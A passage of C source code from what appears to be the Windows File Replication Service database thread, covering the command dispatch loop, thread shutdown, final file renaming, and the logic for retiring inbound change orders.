                FStatus = FStatus1;
            }

            Replica->pVme = NULL;
            Replica->IsJournaling = FALSE;

            //
            // If no more replicas on this volume then we're done.
            //
            if (pVme->ActiveReplicas == 0) {
                break;
            }

            //
            // Restart the journal.  Check first if it is PAUSED and
            // set state to starting to get it out of the paused state.
            //
            if (pVme->JournalState != JRNL_STATE_INITIALIZING) {
                if (pVme->JournalState == JRNL_STATE_PAUSED) {
                    SET_JOURNAL_AND_REPLICA_STATE(pVme, JRNL_STATE_STARTING);
                } else {
                    DPRINT1(0, "ERROR: CMD_STOP_REPLICATION_SINGLE_REPLICA journal in unexpected state: %s\n",
                            RSS_NAME(pVme->JournalState));
                    SET_JOURNAL_AND_REPLICA_STATE(pVme, JRNL_STATE_ERROR);
                    FRS_ASSERT(!"CMD_STOP_REPLICATION_SINGLE_REPLICA journal in unexpected state");
                    FStatus = FrsErrorJournalStateWrong;
                    break;
                }
            }

            //
            // Set ReplayUsn to start where we left off.
            //
            if (!pVme->ReplayUsnValid) {
                DPRINT1(4, "ReplayUsn was: %08x %08x\n", PRINTQUAD(pVme->ReplayUsn));
                pVme->ReplayUsn = LOAD_JOURNAL_PROGRESS(pVme, pVme->JrnlReadPoint);
                pVme->ReplayUsnValid = TRUE;
                RESET_JOURNAL_PROGRESS(pVme);
            }

            DPRINT1(4, "ReplayUsn is: %08x %08x\n", PRINTQUAD(pVme->ReplayUsn));

            //
            // Crank up a read on the journal to get it going again.
            //
            WStatus = JrnlUnPauseVolume(pVme, NULL, FALSE);

            if (!WIN_SUCCESS(WStatus)) {
                DPRINT_WS(0, "Error from JrnlUnPauseVolume", WStatus);
                FStatus =  FrsErrorJournalStartFailed;
                SET_JOURNAL_AND_REPLICA_STATE(pVme, JRNL_STATE_ERROR);
            } else {
                DPRINT(0, "JrnlUnPauseVolume success.\n");
                FStatus =  FrsErrorSuccess;
            }


            break;

        //
        // Retire the inbound change order by updating the IDTable and deleting
        // the associated inbound log entry.
        //
        case CMD_DBS_RETIRE_INBOUND_CO:

            FStatus = DbsRetireInboundCo(ThreadCtx, CmdPkt);
            break;

        //
        // Inject the handcrafted change order into the outbound log.
        //      Designed to support a version vector join (vvjoin.c)
        //
        case CMD_DBS_INJECT_OUTBOUND_CO:

            FStatus = DbsInjectOutboundCo(ThreadCtx, CmdPkt);
            break;

        //
        // Set the inbound change order to be retried.
        //
        case CMD_DBS_RETRY_INBOUND_CO:

            FStatus = DbsRetryInboundCo(ThreadCtx, CmdPkt);
            break;

        //
        // Save the journal USN and the VSN in each replica set serviced
        // by the specified volume.  The caller has taken a ref on the Vme.
        // We drop it here.
        //
        case CMD_DBS_REPLICA_SAVE_MARK:

            pVme = (PVOLUME_MONITOR_ENTRY) CallContext;
            ForEachListEntry( &pVme->ReplicaListHead, REPLICA, VolReplicaList,
                //
                // Iterator pE is of type REPLICA.
                //
                DbsReplicaSaveMark(ThreadCtx, pE, pVme);
            );

            //
            // Drop the ref on the VME taken by the caller.
            //
            ReleaseVmeRef(pVme);

            FStatus = FrsErrorSuccess;

            break;


        //
        // Save the replica service state and the last shutdown time.
        //
        case CMD_DBS_REPLICA_SERVICE_STATE_SAVE:

            FStatus = DbsUpdateConfigTableFields(ThreadCtx,
                                                 Replica,
                                                 CnfCloseFieldList,
                                                 CnfCloseFieldCount);
            DPRINT1_FS(0, "DbsReplicaServiceStateSave on %ws.", Replica->ReplicaName->Name, FStatus);

            break;


        case CMD_PAUSE_SUBSYSTEM:
        case CMD_QUERY_INFO_SUBSYSTEM:
        case CMD_SET_CONFIG_SUBSYSTEM:
        case CMD_QUERY_CONFIG_SUBSYSTEM:
        case CMD_CANCEL_COMMAND_SUBSYSTEM:
        case CMD_READ_SUBSYSTEM:
        case CMD_WRITE_SUBSYSTEM:
        case CMD_PREPARE_SERVICE1:
        case CMD_PREPARE_SERVICE2:
        case CMD_START_SERVICE:
        case CMD_STOP_SERVICE:
        case CMD_PAUSE_SERVICE:
        case CMD_QUERY_INFO_SERVICE:
        case CMD_SET_CONFIG_SERVICE:
        case CMD_QUERY_CONFIG_SERVICE:
        case CMD_CANCEL_COMMAND_SERVICE:
        case CMD_READ_SERVICE:
        case CMD_WRITE_SERVICE:

        default:
            DPRINT1(0, "ERROR - Unsupported DBService command: %d\n", CmdPkt->Command);

        }  // end switch


        //
        // Cleanup if we did a table operation.
        //
        if (TableCtx != NULL) {
            //
            // If we are using the table ctx on the stack then always close
            // and free the record storage before returning.
            //
            if (TableCtx == TempTableCtx) {
                DbsCloseTable(jerr1, Sesid, TableCtx);
                DbsFreeTableCtx(TableCtx, 1);
            } else
            //
            // It's an allocated table ctx.  Check close and free flags to
            // decide what to do.
            //
            if (AccessClose || AccessFreeTableCtx) {
                DbsCloseTable(jerr1, Sesid, TableCtx);

                if (AccessFreeTableCtx) {
                    DbsFreeTableCtx(TableCtx, 1);
                    DbsRequest->TableCtx = FrsFree(TableCtx);
                }
            }
        }
        FrsRtlUnIdledQueue(IdledQueue);

        //
        // Retire the command packet.
        //
        DbsRequest->FStatus = FStatus;

        FrsCompleteCommand(CmdPkt, FStatus);

    }  // end while

    //
    // terminate thread.
    //

EXIT_THREAD:
    NOTHING;
    //
    //
    // Get exception status.
    //
    } except (EXCEPTION_EXECUTE_HANDLER) {
        GET_EXCEPTION_CODE(WStatus);
    }


    } finally {

        if (WIN_SUCCESS(WStatus)) {
            if (AbnormalTermination()) {
                WStatus = ERROR_OPERATION_ABORTED;
            }
        }

        DPRINT_WS(0, "DBService finally.", WStatus);

        //
        // Trigger FRS shutdown if we terminated abnormally.
        //
        if (!WIN_SUCCESS(WStatus)) {
            DPRINT(0, "DBService terminated abnormally, forcing service shutdown.\n");
            FrsIsShuttingDown = TRUE;
            SetEvent(ShutDownEvent);
        }
    }

    //
    // Let the other threads using Jet close down.
    //
    SleepCount = 21;
    while ((OpenDatabases > 1) && (--SleepCount > 0)) {
        Sleep(1*1000);
    }

    //
    // Update time and state fields in the init config record.
    //
    FRS_ASSERT(FrsInitReplica != NULL);

    ConfigRecord = FrsInitReplica->ConfigTable.pDataRecord;
    FRS_ASSERT(ConfigRecord != NULL);

    GetSystemTimeAsFileTime((PFILETIME)&ConfigRecord->LastShutdown);
    SET_SERVICE_STATE(FrsInitReplica, CNF_SERVICE_STATE_CLEAN_SHUTDOWN);
    FStatus = DbsUpdateConfigTableFields(ThreadCtx,
                                         FrsInitReplica,
                                         CnfCloseFieldList,
                                         CnfCloseFieldCount);
    DPRINT_FS(0,"DbsUpdateConfigTableFields for <init> error.", FStatus);

    //
    // Close the table, reset the TableCtx Tid and Sesid.
    // DbsCloseTable is a Macro, writes 1st arg.
    //
    DbsCloseTable(jerr, ThreadCtx->JSesid, (&FrsInitReplica->ConfigTable));
    DPRINT1_JS(0, "ERROR - Table %s close :",
                FrsInitReplica->ConfigTable.pJetTableCreate->szTableName, jerr);

    //
    // Close the session, free the jet thread context, terminate Jet.
    //
    jerr = DbsCloseJetSession(ThreadCtx);
    CLEANUP_JS(0,"DbsCloseJetSession error:", jerr, ERROR_TERM_JET);

    DPRINT(4,"DbsCloseJetSession complete\n");

ERROR_TERM_JET:
    jerr = JetTerm(ThreadCtx->JInstance);
    if (!JET_SUCCESS(jerr)) {
        DPRINT_JS(1,"JetTerm error:", jerr);
    } else {
        DPRINT(4,"JetTerm complete\n");
    }
    //
    // Free storage allocated during Now free the storage associated with all the system init config table
    // and the system init REPLICA struct as well.
    //
    FrsInitReplica = FrsFreeType(FrsInitReplica);
    ThreadCtx = FrsFreeType(ThreadCtx);

    //
    // The thread does not return from this call
    //
    DPRINT(0, "DataBase is exiting.\n");
    FrsExitCommandServer(&DBServiceCmdServer, FrsThread);

    return ERROR_SUCCESS;
}


ULONG
DbsRenameFid(
    IN PCHANGE_ORDER_ENTRY ChangeOrder,
    IN PREPLICA            Replica
)
/*++

Routine Description:

    A remote change order has completed installing a new file
    into a temporary file in the target directory. The temporary
    file is now renamed to its final name.

    Any error encountered while performing the above will cause the
    change order to be put into the "wait for install retry" state and
    the rename will be retried periodically.

Arguments:

    ChangeOrder - change order entry containing the final name.
    Replica    -- The Replica set struct.

Return Value:

    WIN_SUCCESS         - No problems
    WIN_RETRY_INSTALL   - retry later
    Anything else       - pretend there were no problems

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRenameFid:"
    DWORD                   NameLen;
    DWORD                   WStatus;
    PCHANGE_ORDER_COMMAND   Coc = &ChangeOrder->Cmd;
    ULONG                   GStatus;
    BOOL                    RemoteCo;


    FRS_ASSERT(COE_FLAG_ON(ChangeOrder, COE_FLAG_NEED_RENAME));


    RemoteCo = !CO_FLAG_ON(ChangeOrder, CO_FLAG_LOCALCO);

    //
    // Rename the new file into place.  Note: Use the fid to find the file
    // since it is possible (in the case of pre-install files) that the
    // file name (based on CO Guid) when the pre-install file was first
    // created was done by a different CO than this CO which is doing the
    // final reaname.  E.g. the first CO creates pre-install and then goes
    // into the fetch retry state when the connection unjoins.  A later CO
    // arrives for the same file but with a different CO Guid via a different
    // connection.  Bug 367113 was a case like this.
    //
    WStatus = StuPreInstallRename(ChangeOrder);

    if (WIN_ALREADY_EXISTS(WStatus)) {

        //
        // There should be no name collision because the name morph check was
        // done up front when the CO was issued.  So either this is an old
        // file laying around that is not in the database or it was just created
        // locally.  Either way we own the name now so free it up.
        // If it was a local CO that beat us to the name then when the local
        // CO is processed the deleted file will cause it to be rejected.
        // The window where this can occur is narrow since the local CO would
        // have to be generated after the remote CO was already inserted into
        // the process queue ahead of it.  The user will just think they lost
        // the race.
        //
        WStatus = FrsDeleteFileRelativeByName(
                      ChangeOrder->NewReplica->pVme->VolumeHandle,
                      &Coc->NewParentGuid,
                      Coc->FileName,
                      ChangeOrder->NewReplica->pVme->FrsWriteFilter);

        if (!WIN_SUCCESS(WStatus)) {
            CHANGE_ORDER_TRACEW(3, ChangeOrder, "Failed to del name loser - Retry later", WStatus);
            return ERROR_ALREADY_EXISTS;
        }
        WStatus = StuPreInstallRename(ChangeOrder);
    }

    if (WIN_SUCCESS(WStatus)) {
        CHANGE_ORDER_TRACE(3, ChangeOrder, "Final rename success");
        CLEAR_COE_FLAG(ChangeOrder, COE_FLAG_NEED_RENAME);

        //
        // Update the volume parent file ID table for remote Change Orders.
        // Now that the file is installed we could start seeing local COs
        // for it.
        //
        if (RemoteCo) {
            GStatus = QHashInsert(Replica->pVme->ParentFidTable,
                                  &ChangeOrder->FileReferenceNumber,
                                  &ChangeOrder->ParentFileReferenceNumber,
                                  Replica->ReplicaNumber,
                                  FALSE);
            if (GStatus != GHT_STATUS_SUCCESS ) {
                DPRINT1(0, "++ ERROR - QHashInsert on parent FID table status: %d\n", GStatus);
            }

            if (CoIsDirectory(ChangeOrder)) {
                //
                // Update the volume filter table for new remote change orders.
                //
                if (COE_FLAG_ON(ChangeOrder, COE_FLAG_REANIMATION)) {
                    CHANGE_ORDER_TRACE(3, ChangeOrder, "RmtCo AddVolDir Filter - Reanimate");
                } else {
                    CHANGE_ORDER_TRACE(3, ChangeOrder, "RmtCo AddVolDir Filter");
                }

                WStatus = JrnlAddFilterEntryFromCo(Replica, ChangeOrder, NULL);
                if (!WIN_SUCCESS(WStatus)) {

                    //
                    // See comment in  JrnlFilterLinkChildNoError() for how
                    // this can happen.  Let the CO complete.
                    //
                    CHANGE_ORDER_TRACEW(3, ChangeOrder, "JrnlAddFilterEntryFromCo failed", WStatus);
                    WStatus = ERROR_SUCCESS;
                }
            }
        }

        return WStatus;
    }

    //
    // If it's a retriable problem; do so
    //
    if (WIN_RETRY_INSTALL(WStatus) || WIN_ALREADY_EXISTS(WStatus) ||
        WStatus == ERROR_DELETE_PENDING) {
        CHANGE_ORDER_TRACEW(3, ChangeOrder, "Final Rename Failed - Retrying", WStatus);
    } else {
        //
        // Its not a retriable problem; give up
        //
        CHANGE_ORDER_TRACEW(3, ChangeOrder, "Final Rename Failed - Fatal", WStatus);
    }

    return WStatus;
}


ULONG
DbsRetireInboundCoOld(
    IN PTHREAD_CTX ThreadCtx,
    IN PCOMMAND_PACKET CmdPkt
)
/*++

Routine Description:

    Note:  This comment needs to be revised.


    This function retires an inbound change order.

    Change order retire is complicated by the need to propagate the change
    orders so all change orders from the same originator propagate in the same
    sequence that they were generated.  This is because change order dampening
    tracks the highest VSN it has seen so far from a given orginator.  For
    example, if we sent change orders for two different files from the same
    originator to our outbound partner out of sequence, the dampening logic
    would cause the earlier change orders to be ignored (since having a higher
    VSN, the partner concludes that it must be up to date).

    Inbound Change order retire is divided into two phases:
    Initial retire and Final retire.

    Initial retire is when change order processing is sufficiently complete
    such that it can now be propagated when it gets to the head of the
    propagation list.  For local change orders this is when the staging file
    is generated and the change order is retiring.  For remote CO's this is
    when the staging file has been fetched from the inbound partner.  At this
    point we can honor any outbound requests for the file and can dampen
    further inbound change orders for the file.  Even if the install of the
    file is blocked due to a sharing violation on the target file we can still
    send out the staging file.

    Final retire occurs when the change order is completed and has been
    propagated to the oubound log.  It can now be deleted from the inbound
    log.

    The propagation of the change order to the outbound log can occur at the
    time of Initial Retire or later if necessary to preserve the sequence
    order.  Propagation involves inserting the change order into the outbound
    log and updating our version vector.  There is no need to propagate the
    CO if there are not outbound partners or there is a single outbound
    partner and the partner Guid matches the originator Guid of the CO.

    Change orders are issued in order by originator (except for retries).
    When they issue a retire slot is reserved for the version vector entry
    assoicated with the CO originator.  The initial retire activates the slot
    and when the slot reaches the head of the list the final retire operations
    are completed.  Even though a change order is in the retry list it still
    has a retire slot reserved so other change orders that may have completed
    behind it can not propagate to the outbound log until the retrying change
    order either completes or aborts.

    There are state flags in the change order command (that is stored in the
    Inbound and Outbound logs) which track current progress of the Change order.
    When a remote CO has successfully fetched the staging file the VV retire
    slot is activated, Ack is sent to the inbound partner.  The CO flag
    CO_FLAG_VV_ACTIVATED is set so this isn't done again.  If the CO will go
    through the retry path until it finally completes so there is code both
    in the Main retire path and the retry path to check CO_FLAG_VV_ACTIVATED
    and do the work if needed.

    See the comments in DbsRetryInboundCo() for the current retry scenarios.

    A change order can Abort after issuing.  This is typically caused by a later
    update to the file that superceded the update from this CO.

    The table below shows what work is done as an inbound change order is
    processed through the various retire phases or is aborted.


     Local CO     |    Remote CO
   Accept  Abort  | Accept Abort
                  |
                  |
INITIAL_RETIRE    |              [Local CO gened or remote CO fetched stage file.]
     x            |  x           Update the IDTable entry
                  |  x      x    Ack inbound partner
     x       x    |  x      x    Release Issue interlocks (see below).
     x       a    |  x      x    Activate VV entry
                  |
CO_PROPAGATE      |              [slot now at head of list in VVECTOR.C]
     x            |  x      x    Update VV
     x            |  x           Insert CO in outbound log (if partners)
                  |
CO_ABORT          |
             d    |              Delete the IDTable entry
             x    |         x    Delete staging file.
                  |
FINAL_RETIRE      |              [CO PROP done or CO ABORT done]
                  |  x           Delete staging file IF no outbound partners
     x       x    |  x      x    Delete the INlog entry (if no more retry)
     x       x    |  x      x    Delete the Replica Thread Ctx struct
     x       x    |  x      x    Free the Change Order
                  |
                  |
Release Issue Interlocks-
     x       x    |  x      x    Delete the Active Inbound Change Order table entry
     x       x    |  x      x    Delete the Active child entry
     x       x    |  x      x    Delete the entry from the change order GUID table
     x       x    |  x      x    Check if this CO is blocking another and unidle the queue


d - Action performed if file is deleted before it was ever propagated.
a - Entry activated but abort is set so no VV update or propagate occurs.
m - Call VVxx to mark CO as aborted.  If it is not on the list we can do the
    final retire otherwise it is done at CO_PROPAGATE time.

Note - FINAL_RETIRE can only happen after INITIAL_RETIRE or CO_PROPAGATE which
ever occurs last.  A ref count on the change order is used to manage this.

Note - CO_PROPAGATE can happen asynchronous to a retry of the change order.
During retry the CO could be aborted or could finish and another thread could
be doing the CO_PROPAGATE at the same time.  The change order reference count
is used to control who performs the FINAL_RETIRE.


The TableCtx structs in the ChangeOrder RtCtx are used to update the
database records.

Arguments:

    ThreadCtx   -- ptr to the thread context.

    CmdPkt  - The command packt with the retire request.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRetireInboundCoOld:"

    FRS_ERROR_CODE        FStatus;
    JET_ERR               jerr, jerr1;
    PDB_SERVICE_REQUEST   DbsRequest = &CmdPkt->Parameters.DbsRequest;
    PCONFIG_TABLE_RECORD  ConfigRecord;
    PREPLICA              Replica;
    PCHANGE_ORDER_ENTRY   ChangeOrder;
    PCHANGE_ORDER_COMMAND CoCmd;
    PREPLICA_THREAD_CTX   RtCtx;
    PTABLE_CTX            TmpIDTableCtx;
    PIDTABLE_RECORD       IDTableRec;
    BOOL                  ChildrenExist = FALSE;

    ULONG                 RetireFlags = 0;
    BOOL                  RemoteCo, AbortCo, DeleteCo, FirstTime;
    ULONG                 LocationCmd;
    ULONG                 WStatus;
    ULONG                 Len;


    FRS_ASSERT(DbsRequest != NULL);

    Replica       = DbsRequest->Replica;
    FRS_ASSERT(Replica != NULL);

    ChangeOrder   = (PCHANGE_ORDER_ENTRY) DbsRequest->CallContext;
    FRS_ASSERT(ChangeOrder != NULL);


    CoCmd = &ChangeOrder->Cmd;

    LocationCmd = GET_CO_LOCATION_CMD(ChangeOrder->Cmd, Command);
    DeleteCo = (LocationCmd == CO_LOCATION_DELETE) ||
               (LocationCmd == CO_LOCATION_MOVEOUT);

    RemoteCo = !CO_FLAG_ON(ChangeOrder, CO_FLAG_LOCALCO);

    FirstTime = !CO_FLAG_ON(ChangeOrder, CO_FLAG_RETRY);

    AbortCo = COE_FLAG_ON(ChangeOrder, COE_FLAG_STAGE_ABORTED) ||
              CO_STATE_IS(ChangeOrder, IBCO_ABORTING);

    ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);
    FRS_ASSERT(ConfigRecord != NULL);


TOP:

    //
    // Increment the Local OR Remote CO Aborted OR Retired counters
    //
    if (AbortCo) {
        if (RemoteCo) {
            PM_INC_CTR_REPSET(Replica, RCOAborted, 1);
        }
        else {
            PM_INC_CTR_REPSET(Replica, LCOAborted, 1);
        }
    }
    else {
        if (RemoteCo) {
            PM_INC_CTR_REPSET(Replica, RCORetired, 1);
        }
        else {
            PM_INC_CTR_REPSET(Replica, LCORetired, 1);
        }
    }

    //
    // A newly created file is first installed into a temporary file
    // and then renamed to its final destination. The rename may fail
    // if the user has used the filename for another file. This case
    // is handled later. However, a subsequent change order may arrive
    // before retrying the failing rename. The new change order will
    // attempt the rename because the idtable entry has the deferred
    // rename bit set. This old change order will be discarded by
    // the reconcile code in ChgOrdAccept().
    //
    // We attempt the rename here so that the file's usn value
    // is correct in the change order.
    //
    // Ditto afor deferred deletes.
    //
    WStatus = ERROR_SUCCESS;
    if (!AbortCo &&
        !DeleteCo &&
        COE_FLAG_ON(ChangeOrder, COE_FLAG_NEED_RENAME)) {

        //
        // NOTE: We must use the info in the IDTable to do the final rename
        // since we could have multiple COs in the IBCO_INSTALL_REN_RETRY
        // state and only the IDTable has the correct info re the final location
        // and name for the file.  If the CO does not arrive here in the
        // REN_RETRY state then use the state in the change order as given.
        //
        if (CO_STATE_IS(ChangeOrder, IBCO_INSTALL_REN_RETRY)) {
            RtCtx = ChangeOrder->RtCtx;
            FRS_ASSERT(RtCtx != NULL);

            IDTableRec = RtCtx->IDTable.pDataRecord;
            FRS_ASSERT(IDTableRec != NULL);

            CoCmd->NewParentGuid = IDTableRec->ParentGuid;
            ChangeOrder->NewParentFid = IDTableRec->ParentFileID;

            Len = wcslen(IDTableRec->FileName) * sizeof(WCHAR);
            CopyMemory(CoCmd->FileName, IDTableRec->FileName, Len);
            CoCmd->FileName[Len/sizeof(WCHAR)] = UNICODE_NULL;

            CoCmd->FileNameLength = (USHORT) Len;
        }


        //TEST_DBSRENAMEFID_TOP(ChangeOrder);
        WStatus = DbsRenameFid(ChangeOrder, Replica);
        //TEST_DBSRENAMEFID_BOTTOM(ChangeOrder, WStatus);

        //
        // Short circuit the retire process if the file could not be renamed
        // into its final destination.  Set the change order as "retry later"
        // in the inbound log.  The change order is done except for this.
        // If this is the first time through for this change order then
        // DbsRetryInboundCo will take care of VV update, partner Ack, ...
        // In addition it updates the IDTable record to show the rename is
        // still pending.
        //
        if (WIN_RETRY_INSTALL(WStatus) ||
            WIN_ALREADY_EXISTS(WStatus)) {
            SET_CHANGE_ORDER_STATE(ChangeOrder, IBCO_INSTALL_REN_RETRY);

            return (DbsRetryInboundCo(ThreadCtx, CmdPkt));
        }

    } else

    if (!AbortCo &&
        DeleteCo &&
        COE_FLAG_ON(ChangeOrder, COE_FLAG_NEED_DELETE)) {
        //
        // Handle deferred delete.
        //
        CHANGE_ORDER_TRACE(3, ChangeOrder, "Attempt Deferred Delete");

        WStatus = StuDelete(ChangeOrder);
        if (!WIN_SUCCESS(WStatus)) {
            //
            // Short circuit the retire process if the file could not be deleted.
            //
            // If this is a file and we failed to delete send the CO thru
            // delete retry.
            // If this is a dir and we failed to delete because the dir is not
            // empty or we got some other retryable error then first check
            // to see if there are any valid children.  If there are valid
            // children then abort the CO otherwise send it thru delete retry
            // which will mark the IDTable entry as IDREC_FLAGS_DELETE_DEFERRED.
            //
            if (WIN_RETRY_DELETE(WStatus)) {
                if (CoIsDirectory(ChangeOrder)) {
                    //
                    // check to see if there are any valid children
                    //
                    // If the dir has vaild children. Check if these children
                    // are waiting to be deleted. They might have the
                    // IDREC_FLAGS_DELETE_DEFERRED flag set in the idtable.
                    // If there is atleast 1 child entry in the idtable that
                    // has an event time later than the even time on the
                    // change order then we should abort the change order.
                    //

                    TmpIDTableCtx = FrsAlloc(sizeof(TABLE_CTX));
                    TmpIDTableCtx->TableType = TABLE_TYPE_INVALID;
                    TmpIDTableCtx->Tid = JET_tableidNil;

                    jerr = DbsOpenTable(ThreadCtx, TmpIDTableCtx, Replica->ReplicaNumber, IDTablex, NULL);

                    if (JET_SUCCESS(jerr)) {

                        ChildrenExist = JrnlDoesChangeOrderHaveChildren(ThreadCtx, TmpIDTableCtx, ChangeOrder);

                        DbsCloseTable(jerr1, ThreadCtx->JSesid, TmpIDTableCtx);
                        DbsFreeTableCtx(TmpIDTableCtx, 1);
                        FrsFree(TmpIDTableCtx);

                        if (ChildrenExist) {

                            CHANGE_ORDER_TRACE(3, ChangeOrder, "DIR has valid child. Aborting");
                            AbortCo = TRUE;
                            SET_CHANGE_ORDER_STATE(ChangeOrder, IBCO_ABORTING);

                            //
                            // Even though we can't delete the dir this del CO was
                            // accepted so we need to update the version info in
                            // the IDTable record.  This ensures that if any new local
                            // changes to this dir are generated, the version info
                            // that gets sent out is current so the CO will be
                            // accepted downstream in the event that the downstream
                            // member did actually accept and process this delete.
                            // If that had happened but later the dir was reanimated
                            // downstream (say because we generated a new child file)
                            // the version info downstream is retained which could
                            // cause a later update (or a delete) from this member
                            // to be rejected (e.g. event time within the window
                            // but out version number is lower than it should be).
                            // bug 290440 is an example of this.
                            //
                            SetFlag(RetireFlags, ISCU_UPDATE_IDT_VERSION);
                            goto TOP;
                        }
                    } else {
                        DPRINT1_JS(0, "DbsOpenTable (IDTABLE) on replica number %d failed.",
                                   Replica->ReplicaNumber, jerr);
                        DbsCloseTable(jerr1, ThreadCtx->JSesid, TmpIDTableCtx);
                        DbsFreeTableCtx(TmpIDTableCtx, 1);
                        FrsFree(TmpIDTableCtx);
                    }

                }
                //
                // Set the change order as IBCO_INSTALL_DEL_RETRY in the
                // inbound log.  The change order is done except for this.  If
                // this is the first time through for this change order then
                // DbsRetryInboundCo will take care of VV update, partner Ack,
                // ...  In addition it updates the IDTable record to show the
                // delete is still pending.
                //
                SET_CHANGE_ORDER_STATE(ChangeOrder, IBCO_INSTALL_DEL_RETRY);

                return (DbsRetryInboundCo(ThreadCtx, CmdPkt));
            }
        }
    }

    //
    // Decide what to do about the staging file.
    // A local change order is trying to generate the staging file and a
    // failure here means it hasn't yet been generated.
    // A remote change order is trying to fetch and install the staging file
    // and a failure here means the install could not be completed.
    // There are a number of cases.
    //
    // Local, No partners  -- no staging file is created.
    // Local, 1st time, With partners -- Outlog will del staging file
    // Local, 1st time, Abort, With partners -- Del stagefile (if any)
    // Local, retry, with partners -- stagefile now gen, Outlog dels staging file
    // Local, retry, abort, with partners -- Del stagefile (if any)
    //
    // Remote, No partners  -- Del stagefile
    // Remote, 1st time, with partners -- OLOG will del stagefile
    // Remote, 1st time, Abort, with partners -- Del stagefile
    // Remote, retry, with partners -- Clear flag in olog
    // Remote, retry, Abort, with partners -- clear flag in olog
    //

    SET_CHANGE_ORDER_STATE(ChangeOrder, IBCO_COMMIT_STARTED);

    //
    // Check for the case of an aborted CO.  We do nothing here if the user
    // deleted the file so we couldn't generate the staging file.
    //
    if (AbortCo &&
        !COE_FLAG_ON(ChangeOrder, COE_FLAG_STAGE_DELETED)) {
        //
        // If the abort is on a dir create then pitch the CO.
        // (not if it's a parent reanimation though).
        // (not if it's a reparse)
        //

        if (CoIsDirectory(ChangeOrder) &&
            (!COE_FLAG_ON(ChangeOrder, COE_FLAG_PARENT_REANIMATION)) &&
            (!(CoCmd->FileAttributes & FILE_ATTRIBUTE_REPARSE_POINT))) {

            if (CO_NEW_FILE(LocationCmd)) {
                //
                // Unfortunately we can get an "update CO" for an existing file
                // and the CO has a location command of CREATE.  So we can't
                // be sure that the error we are seeing is a case of failing
                // to update a pre-existing file in the replica tree that has
                // been deleted out from under us.   If it has been deleted
                // then a local CO should be coming that tells us that.
                // If it hasn't been deleted and the install failed because we
                // ran out of disk space or some other problem then we could
                // have problems later when a child create shows up and there
                // is no parent.  To address this, InstallCsInstallStage()
                // checks if the pre-exisitng target file was deleted and it
                // sends the change order thru retry (or unjoins the connection)
                // as appropriate.  If a dir create fails for some other reason
                // we end up here.
                //
                CHANGE_ORDER_TRACE(3, ChangeOrder, "Dir create failed, aborting");
                FRS_PRINT_TYPE(0, ChangeOrder);
            }
        }
    }

    if (RemoteCo) {

        //
        // Remote CO retire.  Activate VV retire slot if not yet done.
        //

        if (!CO_FLAG_ON(ChangeOrder, CO_FLAG_VV_ACTIVATED)) {

            SetFlag(RetireFlags, ISCU_ACTIVATE_VV | ISCU_ACK_INBOUND);

            if (CO_FLAG_ON(ChangeOrder, CO_FLAG_GROUP_ANY_REFRESH)) {
                SetFlag(RetireFlags, ISCU_DEL_STAGE_FILE);
            } else {
                SetFlag(RetireFlags, ISCU_INS_OUTLOG);
            }

            //SET_CO_FLAG(ChangeOrder, CO_FLAG_VV_ACTIVATED);
        } else if (CO_FLAG_ON(ChangeOrder, CO_FLAG_RETRY)) {
            if (!CO_FLAG_ON(ChangeOrder, CO_FLAG_GROUP_ANY_REFRESH)) {
                SetFlag(RetireFlags, (ISCU_INS_OUTLOG |
                                      ISCU_INS_OUTLOG_NEW_GUID |
                                      ISCU_ACK_INBOUND));
            } else {
                SetFlag(RetireFlags, ISCU_ACK_INBOUND);
            }
        }
        //
        // Install is done.  Clear incomplete flag and update IDT entry
        // with the new file state.
        //
        CLEAR_CO_FLAG(ChangeOrder, CO_FLAG_INSTALL_INCOMPLETE);
        SetFlag(RetireFlags, ISCU_UPDATE_IDT_ENTRY);
        //
        // Note:  If partial installs are provided then only update the
        //        appropriate IDTable elements to prevent data from moving
        //        backwards if the partial instals can complete out of order.
        //
        //
        // If the outlog record has been inserted then its install
        // incomplete flag must be cleared.  If there are no outbound partners
        // then the stage file is deleted in ChgOrdIssueCleanup().
        //
        SetFlag(RetireFlags, ISCU_DEL_STAGE_FILE_IF);

        //
        // If this remote CO is aborting then don't update IDTable and don't
        // insert it into the outbound log if it hasn't happened yet.
        // The flags set above will still cause the VV update and the inbound
        // partner Ack to occur.  If this is a new file then delete the IDTable
        // entry too.
        //
        if (AbortCo) {
            SET_CO_FLAG(ChangeOrder, CO_FLAG_ABORT_CO);
            //
            // If however we are updating our version info, even if the CO is
            // aborting, then allow it to be sent to the outlog so downstream
            // members can make the same choice.  See the case above when we
            // abort because the DIR has a valid child.
            //
            if (!BooleanFlagOn(RetireFlags, ISCU_UPDATE_IDT_VERSION)) {
                ClearFlag(RetireFlags, (ISCU_INS_OUTLOG |
                                        ISCU_INS_OUTLOG_NEW_GUID));
            }

            ClearFlag(RetireFlags, ISCU_UPDATE_IDT_ENTRY);

            if (CO_IFLAG_ON(ChangeOrder, CO_IFLAG_VVRETIRE_EXEC)) {
                SetFlag(RetireFlags, ISCU_CO_ABORT);
            } else {
                SetFlag(RetireFlags, ISCU_ACTIVATE_VV_DISCARD |
                                     ISCU_DEL_PREINSTALL      |
                                     ISCU_DEL_STAGE_FILE);
            }

            if (CO_FLAG_ON(ChangeOrder, CO_FLAG_NEW_FILE)) {
                SetFlag(RetireFlags, ISCU_DEL_IDT_ENTRY);
            }

            TALLY_REMOTECO_STATS(ConfigRecord, NumCoAborts, 1);
        } else {
            TALLY_REMOTECO_STATS(ConfigRecord, NumCoRetired, 1);
        }

    } else {

        //
        // Local CO retire.
        //
        if (AbortCo) {
            //
            // Local CO aborted (probably USN change).  Discard VV retire slot
            // and delete the staging file and delete the IDTable entry if this
            // was a new file.
            //
            SET_CO_FLAG(ChangeOrder, CO_FLAG_ABORT_CO);
            SetFlag(RetireFlags, ISCU_ACTIVATE_VV_DISCARD |
                                 ISCU_DEL_STAGE_FILE);

            if (CO_FLAG_ON(ChangeOrder, CO_FLAG_NEW_FILE)) {
                SetFlag(RetireFlags, ISCU_DEL_IDT_ENTRY);
            }

            TALLY_LOCALCO_STATS(ConfigRecord, NumCoAborts, 1);

        } else {
            //
            // Local CO retire.  Activate VV retire slot if not yet done.
            //
            if (!CO_FLAG_ON(ChangeOrder, CO_FLAG_VV_ACTIVATED)) {
                SetFlag(RetireFlags, ISCU_ACTIVATE_VV);
                //SET_CO_FLAG(ChangeOrder, CO_FLAG_VV_ACTIVATED);
            }
            //
            // None of these events have happened yet.
            //
